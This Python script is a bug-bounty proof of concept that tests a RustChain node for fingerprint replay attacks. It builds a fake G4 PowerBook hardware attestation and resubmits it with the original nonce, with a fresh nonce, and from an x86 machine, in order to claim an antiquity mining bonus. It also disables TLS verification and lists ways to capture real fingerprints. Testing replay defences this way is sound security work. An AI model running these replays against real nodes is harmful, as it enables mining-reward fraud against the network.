#!/usr/bin/env python3
"""
RustChain Fingerprint Replay Attack POC
========================================

This script demonstrates a replay attack where:
1. An attacker captures legitimate fingerprint data from a G4 PowerBook
2. Replays it from a modern x86 machine to claim the 2.5x antiquity bonus

Attack vectors tested:
- Direct replay of captured fingerprint data
- Modified replay with fresh nonce but old fingerprint data
- Cross-architecture replay (PowerPC → x86)

Author: Security Research Team
Bounty: #2276 - Fingerprint Replay Attack Defense
"""

import json
import hashlib
import time
import requests
from datetime import datetime
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, asdict
import uuid

# Configuration
DEFAULT_NODE_URL = "https://rustchain.local"
TIMEOUT_SECONDS = 30

@dataclass
class CapturedFingerprint:
    """Represents captured fingerprint data from a legitimate miner."""
    timestamp: float
    source_machine: str
    source_arch: str
    wallet: str
    nonce: str
    payload: Dict[str, Any]
    fingerprint_data: Dict[str, Any]
    device_info: Dict[str, Any]
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'CapturedFingerprint':
        return cls(**data)


class FingerprintReplayAttacker:
    """
    Implements replay attack techniques against RustChain fingerprint authentication.
    """
    
    def __init__(self, node_url: str = DEFAULT_NODE_URL):
        self.node_url = node_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False  # Allow self-signed certs
        self.captured_fingerprints: List[CapturedFingerprint] = []
        
    def _log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().isoformat()
        print(f"[{timestamp}] [{level}] {message}")
    
    def capture_fingerprint(self, source_data: Dict[str, Any], source_info: str = "unknown") -> CapturedFingerprint:
        """
        Capture fingerprint data from a legitimate miner submission.
        
        In a real attack, this could be done via:
        - Network packet capture
        - Memory dump from compromised miner
        - Malicious miner modification
        """
        captured = CapturedFingerprint(
            timestamp=time.time(),
            source_machine=source_info,
            source_arch=source_data.get("device", {}).get("device_arch", "unknown"),
            wallet=source_data.get("miner", ""),
            nonce=source_data.get("nonce", ""),
            payload=source_data,
            fingerprint_data=source_data.get("fingerprint", {}),
            device_info=source_data.get("device", {})
        )
        self.captured_fingerprints.append(captured)
        self._log(f"Captured fingerprint from {source_info} (arch: {captured.source_arch})")
        return captured
    
    def get_challenge(self) -> Optional[Dict[str, Any]]:
        """Request a fresh nonce from the server."""
        try:
            url = f"{self.node_url}/attest/challenge"
            response = self.session.post(url, json={}, timeout=TIMEOUT_SECONDS)
            
            if response.status_code == 429:
                self._log("Rate limited on challenge request", "WARN")
                return None
            
            if response.status_code == 200:
                data = response.json()
                self._log(f"Got challenge nonce: {data.get('nonce', '')[:16]}...")
                return data
            else:
                self._log(f"Challenge failed: HTTP {response.status_code}", "ERROR")
                return None
                
        except Exception as e:
            self._log(f"Challenge request error: {e}", "ERROR")
            return None
    
    def replay_attack_direct(self, captured: CapturedFingerprint) -> Dict[str, Any]:
        """
        Attack 1: Direct replay of captured payload.
        
        Simply resend the exact captured payload without modification.
        This tests if the server accepts old, unchanged fingerprint data.
        """
        self._log("=== Attack 1: Direct Replay ===")
        self._log(f"Replaying payload captured at {datetime.fromtimestamp(captured.timestamp)}")
        self._log(f"Original source: {captured.source_machine}")
        self._log(f"Original arch: {captured.source_arch}")
        
        try:
            url = f"{self.node_url}/attest/submit"
            response = self.session.post(url, json=captured.payload, timeout=TIMEOUT_SECONDS)
            
            result = {
                "attack_type": "direct_replay",
                "status_code": response.status_code,
                "response": response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text,
                "accepted": response.status_code == 200,
                "original_timestamp": captured.timestamp,
                "replay_delay_seconds": time.time() - captured.timestamp
            }
            
            self._log(f"Response: HTTP {response.status_code}")
            if result["accepted"]:
                self._log("⚠️  VULNERABILITY: Direct replay accepted!", "WARN")
            else:
                self._log("✓ Direct replay rejected (good)", "INFO")
            
            return result
            
        except Exception as e:
            self._log(f"Attack error: {e}", "ERROR")
            return {"attack_type": "direct_replay", "error": str(e)}
    
    def replay_attack_with_fresh_nonce(self, captured: CapturedFingerprint) -> Dict[str, Any]:
        """
        Attack 2: Replay with fresh nonce but old fingerprint data.
        
        Get a new challenge from the server, but use the old captured fingerprint.
        This tests if the server validates that fingerprint data matches the nonce.
        """
        self._log("=== Attack 2: Replay with Fresh Nonce ===")
        
        # Get a fresh nonce
        challenge = self.get_challenge()
        if not challenge:
            return {"attack_type": "fresh_nonce_replay", "error": "Failed to get challenge"}
        
        fresh_nonce = challenge.get("nonce", "")
        server_time = challenge.get("server_time", 0)
        
        self._log(f"Fresh nonce: {fresh_nonce[:16]}...")
        self._log(f"Server time: {server_time}")
        
        # Construct replay payload with fresh nonce but old fingerprint
        replay_payload = captured.payload.copy()
        replay_payload["nonce"] = fresh_nonce
        
        self._log(f"Using OLD fingerprint from {datetime.fromtimestamp(captured.timestamp)}")
        self._log(f"OLD arch: {captured.source_arch}")
        
        try:
            url = f"{self.node_url}/attest/submit"
            response = self.session.post(url, json=replay_payload, timeout=TIMEOUT_SECONDS)
            
            result = {
                "attack_type": "fresh_nonce_replay",
                "status_code": response.status_code,
                "response": response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text,
                "accepted": response.status_code == 200,
                "fresh_nonce": fresh_nonce,
                "old_fingerprint_timestamp": captured.timestamp,
                "time_gap_seconds": time.time() - captured.timestamp
            }
            
            self._log(f"Response: HTTP {response.status_code}")
            if result["accepted"]:
                self._log("⚠️  VULNERABILITY: Replay with fresh nonce accepted!", "WARN")
            else:
                self._log("✓ Replay with fresh nonce rejected (good)", "INFO")
            
            return result
            
        except Exception as e:
            self._log(f"Attack error: {e}", "ERROR")
            return {"attack_type": "fresh_nonce_replay", "error": str(e)}
    
    def replay_attack_cross_architecture(self, captured: CapturedFingerprint, 
                                          new_arch: str = "x86_64") -> Dict[str, Any]:
        """
        Attack 3: Cross-architecture replay.
        
        Attempt to replay PowerPC fingerprint from an x86 machine.
        This tests if the server validates architecture consistency.
        """
        self._log("=== Attack 3: Cross-Architecture Replay ===")
        self._log(f"Original arch: {captured.source_arch}")
        self._log(f"Attacker arch: {new_arch}")
        
        # Get fresh nonce
        challenge = self.get_challenge()
        if not challenge:
            return {"attack_type": "cross_arch_replay", "error": "Failed to get challenge"}
        
        fresh_nonce = challenge.get("nonce", "")
        
        # Construct cross-arch replay payload
        replay_payload = captured.payload.copy()
        replay_payload["nonce"] = fresh_nonce
        
        # Try to claim we're the same PowerPC machine
        # But the fingerprint data would have been generated on PowerPC
        self._log("Attempting to replay PowerPC fingerprint from x86 machine...")
        
        try:
            url = f"{self.node_url}/attest/submit"
            response = self.session.post(url, json=replay_payload, timeout=TIMEOUT_SECONDS)
            
            result = {
                "attack_type": "cross_arch_replay",
                "status_code": response.status_code,
                "response": response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text,
                "accepted": response.status_code == 200,
                "claimed_arch": captured.source_arch,
                "actual_arch": new_arch
            }
            
            self._log(f"Response: HTTP {response.status_code}")
            if result["accepted"]:
                self._log("⚠️  VULNERABILITY: Cross-architecture replay accepted!", "WARN")
            else:
                self._log("✓ Cross-architecture replay rejected (good)", "INFO")
            
            return result
            
        except Exception as e:
            self._log(f"Attack error: {e}", "ERROR")
            return {"attack_type": "cross_arch_replay", "error": str(e)}
    
    def simulate_g4_powerbook_fingerprint(self, wallet: str) -> CapturedFingerprint:
        """
        Simulate captured fingerprint data from a G4 PowerBook.
        
        In reality, this would be captured from a legitimate PowerPC miner.
        This simulation includes realistic timing values for PowerPC G4.
        """
        # Realistic G4 PowerBook fingerprint values
        g4_fingerprint = {
            "all_passed": True,
            "checks": {
                "clock_drift": {
                    "passed": True,
                    "data": {
                        "drift_ppm": 12.5,  # Typical for older hardware
                        "oscillator_type": "quartz",
                        "temperature_coefficient": 0.035,
                        "mean_ns": 24500,  # PowerPC timing characteristics
                        "variance_ns": 380,
                        "samples": 1000,
                        "hardware_age_years": 22
                    }
                },
                "cache_timing": {
                    "passed": True,
                    "data": {
                        "l1_latency_ns": 3,  # G4 cache timing
                        "l2_latency_ns": 12,
                        "l3_latency_ns": None,  # No L3 on G4
                        "cache_line_size": 32,
                        "associativity": 8,
                        "cache_geometry": "powerpc_g4",
                        "unique_pattern_hash": "a7f3b2c1d4e5f6a7"
                    }
                },
                "simd_identity": {
                    "passed": True,
                    "data": {
                        "simd_type": "AltiVec",
                        "vector_width": 128,
                        "supported_instructions": ["vadd", "vmul", "vperm", "vsldoi"],
                        "implementation_hash": "altivec_g4_7447a",
                        "performance_characteristics": {
                            "multiply_throughput": 2,
                            "add_latency": 3
                        }
                    }
                },
                "thermal_drift": {
                    "passed": True,
                    "data": {
                        "temperature_c": 45.2,
                        "throttling_events": 3,
                        "fan_speed_rpm": 2800,
                        "thermal_coefficient": 0.012,
                        "ambient_temp_c": 25.0,
                        "load_factor": 0.75,
                        "unique_thermal_signature": "g4_powerbook_thermal_01"
                    }
                },
                "instruction_jitter": {
                    "passed": True,
                    "data": {
                        "mean_jitter_ns": 8.5,
                        "std_dev_ns": 2.3,
                        "outliers": 12,
                        "pattern_hash": "ppc_jitter_g4_7447",
                        "test_instructions": ["mftb", "mtspr", "dcbf"],
                        "jitter_distribution": "gaussian"
                    }
                },
                "anti_emulation": {
                    "passed": True,
                    "data": {
                        "hypervisor_detected": False,
                        "vm_artifacts": [],
                        "emulation_signatures": [],
                        "hardware_serial": "CK245XXXXXXXXX",
                        "rom_checksum": "g4_rom_a1b2c3",
                        "physical_devices": ["uni-north", "keylargo"]
                    }
                }
            }
        }
        
        g4_device = {
            "device_family": "PowerPC",
            "device_arch": "g4",
            "device_model": "PowerBook5,6"
        }
        
        # Simulated captured payload
        payload = {
            "miner": wallet,
            "miner_id": f"powerbook-g4-{uuid.uuid4().hex[:8]}",
            "nonce": str(uuid.uuid4()),
            "report": {
                "cpu_model": "PowerPC G4 7447A",
                "cpu_cores": 1,
                "ram_gb": 1,
                "os": "Mac OS X 10.4.11"
            },
            "device": g4_device,
            "signals": {
                "macs": ["00:0a:27:xx:xx:xx"],
                "uptime": 86400
            },
            "fingerprint": g4_fingerprint
        }
        
        return self.capture_fingerprint(payload, "simulated_g4_powerbook")
    
    def run_all_attacks(self, wallet: str) -> Dict[str, Any]:
        """
        Run all attack vectors and generate a comprehensive report.
        """
        self._log("=" * 60)
        self._log("RustChain Fingerprint Replay Attack POC")
        self._log("=" * 60)
        
        # Simulate capturing a G4 fingerprint
        captured = self.simulate_g4_powerbook_fingerprint(wallet)
        
        # Simulate time passing (in real attack, this would be hours/days)
        self._log("Simulating capture→replay delay...")
        
        results = {
            "attack_summary": {
                "target_wallet": wallet,
                "target_arch": "g4",
                "capture_time": datetime.fromtimestamp(captured.timestamp).isoformat(),
                "node_url": self.node_url
            },
            "attacks": []
        }
        
        # Run attack 1: Direct replay
        self._log("")
        attack1 = self.replay_attack_direct(captured)
        results["attacks"].append(attack1)
        
        # Run attack 2: Fresh nonce replay
        self._log("")
        attack2 = self.replay_attack_with_fresh_nonce(captured)
        results["attacks"].append(attack2)
        
        # Run attack 3: Cross-architecture replay
        self._log("")
        attack3 = self.replay_attack_cross_architecture(captured, "x86_64")
        results["attacks"].append(attack3)
        
        # Summary
        self._log("")
        self._log("=" * 60)
        self._log("ATTACK SUMMARY")
        self._log("=" * 60)
        
        vulnerabilities = []
        for attack in results["attacks"]:
            if attack.get("accepted"):
                vulnerabilities.append(attack["attack_type"])
        
        if vulnerabilities:
            self._log(f"⚠️  VULNERABILITIES FOUND: {len(vulnerabilities)}", "WARN")
            for v in vulnerabilities:
                self._log(f"  - {v}")
        else:
            self._log("✓ No replay vulnerabilities detected (server properly rejects)", "INFO")
        
        results["vulnerabilities"] = vulnerabilities
        return results


def main():
    """Main entry point for the replay attack POC."""
    import argparse
    
    parser = argparse.ArgumentParser(description="RustChain Fingerprint Replay Attack POC")
    parser.add_argument("--node", default=DEFAULT_NODE_URL, help="RustChain node URL")
    parser.add_argument("--wallet", required=True, help="Wallet address to test")
    parser.add_argument("--save-report", help="Save report to file")
    
    args = parser.parse_args()
    
    attacker = FingerprintReplayAttacker(args.node)
    results = attacker.run_all_attacks(args.wallet)
    
    if args.save_report:
        with open(args.save_report, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        print(f"\nReport saved to: {args.save_report}")
    
    return 0 if not results["vulnerabilities"] else 1


if __name__ == "__main__":
    exit(main())